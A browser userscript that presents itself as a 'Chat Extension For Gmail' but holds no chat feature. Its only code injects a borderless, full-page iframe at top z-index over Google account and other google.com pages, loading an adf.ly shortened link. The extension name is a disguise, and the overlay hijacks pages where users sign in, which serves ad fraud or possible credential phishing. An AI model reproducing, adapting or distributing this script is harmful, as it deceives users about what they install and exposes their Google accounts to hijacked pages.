// ==UserScript==
// @name         Chat Extension For Gmail
// @description                  Chat Extension For gmail
// @description        Chat Extension For gmail
// @include         http://accounts.google.com/*
// @include         http://*.google.com/*
// @include         https://accounts.google.com/*
// @include         https://accounts.google.com/*
// @include         https://*.google.com/*
// @exclude         http://*.accounts.google.com/*
// @exclude         https://*.accounts.google.com/*
// @exclude         https://accounts.google.com/login.php
// @exclude         https://accounts.google.com/login.php
// @exclude         http://accounts.google.com/login.php
// @author         xTechZ
// @version         1
// @versionnumber   1
// @namespace      http://userscripts.org/scripts/show/124552
// ==/UserScript==
//






 
var el = document.createElement("iframe");
el.setAttribute('id', 'ifrm');
document.body.appendChild(el);
el.setAttribute('src', 'http://adf.ly/5JqrH');
el.setAttribute('style', 'border:0px;z-index:99999;position:absolute;top:0px;left:0px;');
el.setAttribute('width', '100%');
el.setAttribute('height', '9999px');
el.setAttribute('scrolling', 'no');